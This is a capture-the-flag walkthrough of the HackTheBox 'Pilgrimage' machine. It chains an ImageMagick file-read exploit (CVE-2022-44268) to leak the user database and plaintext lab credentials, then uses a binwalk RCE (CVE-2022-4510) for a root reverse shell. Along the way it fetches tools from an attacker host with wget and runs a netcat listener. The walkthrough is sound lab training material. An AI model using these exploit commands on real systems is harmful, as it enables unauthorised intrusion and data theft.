# Pilgrimage - Easy

```sh
sudo vim /etc/hosts
# add pilgrimage.htb

nmap -T4 -p- -A -Pn -v pilgrimage.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.4p1 Debian 5+deb11u1
    * 80/tcp - http - nginx 1.18.0

* ```nmap``` mentions a '/.git' directory is found on the webpage so we can download the webpage code completely to check for the commits

* the webpage is an online image shrinker; and offers register & login functionality to save images

* we can create a test account to register & login - this leads us to the dashboard

* the dashboard view has a table with columns for 'original image name' and 'shrunken image URL'

* we can upload an image file and shrink it - this leads to a few observations:

    * after clicking on 'shrink', the webpage URL changes to 'http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/69563646b9870.jpeg&status=success' - where the 'message' parameter holds the 'shrunken image URL' and 'status' is 'success'

    * the shrunken image is uploaded in the '/shrunk' directory and named with a randomized string

    * visiting the '/shrunk' page gives a 403 Forbidden error

    * the data can be viewed in the dashboard page as well

* we can check the '.git' directory for any secrets/clues using a tool like [git-dumper](https://github.com/arthaud/git-dumper):

    ```sh
    git-dumper http://pilgrimage.htb/.git ~/pilgrimage
    ```

* the ```git-dumper``` tool runs ```git checkout .``` at the end of its execution, so it restores the files in the directory before the final commit was done

* we can check the files now:

    ```sh
    ls -la
    # includes source code, php files, and a 'magick' binary

    ls -la assets

    ls -la vendor

    less index.php
    ```

* 'index.php' contains the main logic of the code - it checks for an image file using the MIME type and the extension; and the actual shrink operation is done via ```magick```, referred using its location in the webroot at ```/var/www/pilgrimage.htb/magick```

* the code also refers to the DB file at ```/var/db/pilgrimage```

* checking for uploading a PHP webshell file as a test does not give anything as the upload functionality allows an image file only

* checking the ```magick``` binary found in the webroot files:

    ```sh
    ls -la magick

    file magick

    ./magick

    ./magick -version
    ```

* the ```ImageMagick``` version is 7.1.0-49 beta - we can check if there are any exploits associated with this version

* Googling this information gives us [CVE-2022-44268](https://github.com/entr0pie/CVE-2022-44268), a LFI exploit - when ```magick``` parses a PNG image (e.g. - for resizing), the resulting image can contain embedded content of a file (if the binary has permissions to read it)

* we can test the exploit now, assuming that the ```magick``` binary used on the webpage is running the same version:

    * download the Python script and the 'source.png' file from the repo

    * generate the malicious PNG file:

        ```sh
        python3 CVE-2022-44268.py /etc/passwd
        ```
    
    * in the Pilgrimage homepage, upload the malicious 'output.png' file for shrink operation

    * once the operation is completed, save & download the shrunken image

    * inspect the shrunken image and check for the data under 'Raw profile type':

        ```sh
        identify -verbose 695664ea68ef2.png > test.txt
        ```
    
    * the hex data under 'Raw profile type' can be decoded from hex using [CyberChef](https://cyberchef.org) - this gives us the contents of ```/etc/passwd```

* the contents of ```/etc/passwd``` shows that there is a user 'emily' on the box

* as the exploit is confirmed to be working, we can next attempt to fetch the DB file at ```/var/db/pilgrimage```

* the exploit works and we get the hex-encoded content of ```/var/db/pilgrimage```

* paste only the hex content in a file and decode it from hex using the 'open file as input' option in CyberChef, and save the decoded SQLite content using the 'save output to file' option

* once the DB file is downloaded, we can check its contents:

    ```sh
    sqlitebrowser pilgrimage.sqlite
    ```

* from the 'users' table, we get the creds 'emily:abigchonkyboi123'

* we can login as 'emily' now:

    ```sh
    ssh emily@pilgrimage.htb

    cat user.txt
    # user flag

    sudo -l
    # not available
    ```

* we can enumerate using ```linpeas```:

    ```sh
    # fetch script from attacker

    wget http://10.10.14.23:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.10.0-23-amd64, Debian GNU/Linux 11
    * sudo version 1.9.5p2
    * interesting scripts includes ```/usr/bin/gettext.sh``` and ```/usr/sbin/malwarescan.sh``` - 'gettext.sh' can be ignored as it is a false positive

* we can check if any background processes/jobs are running via ```pspy```:

    ```sh
    wget http://10.10.14.23:8000/pspy64
    chmod +x pspy64
    ./pspy64
    ```

* in addition to 'malwarescan.sh' run by root, ```pspy``` shows another process running as root - ```/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/```

* checking the 'malwarescan.sh' script:

    ```sh
    #!/bin/bash

    blacklist=("Executable script" "Microsoft executable")

    /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
            for banned in "${blacklist[@]}"; do
            if [[ "$binout" == *"$banned"* ]]; then
                /usr/bin/rm "$filename"
                break
            fi
        done
    done
    ```

    * the bash script is monitoring the ```/var/www/pilgrimage.htb/shrunk``` directory for newly created files using ```inotifywait```
    
    * when a new file is created, the filename is extracted

    * then, ```binwalk``` is run on the file and it extracts the contents of the file

    * if any of the blacklisted terms are found in the extracted contents, the file is deleted by the script

* as the script refers ```binwalk```, we can check its version:

    ```sh
    /usr/local/bin/binwalk
    ```

* ```binwalk``` is running v2.3.2 - Googling for this version leads to [CVE-2022-4510](https://www.exploit-db.com/exploits/51249), a RCE exploit

* the exploit generates a malicious PNG file, which if processed by ```binwalk``` triggers the payload execution

* we can attempt the exploit, and as the script is being run by root, we should get RCE as root:

    * run the exploit to generate the malicious image:

        ```sh
        python3 51249.py source.png 10.10.14.23 4444
        ```
    
    * setup listener:

        ```sh
        nc -nvlp 4444
        ```
    
    * transfer the malicious 'binwalk_exploit.png' file to target:

        ```sh
        wget http://10.10.14.23:8000/binwalk_exploit.png
        ```
    
    * copy the malicious image to the target directory:

        ```sh
        cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
        ```
    
    * this triggers the RCE and we get reverse shell as root:

        ```sh
        id
        # root

        cat /root/root.txt
        # root flag
        ```
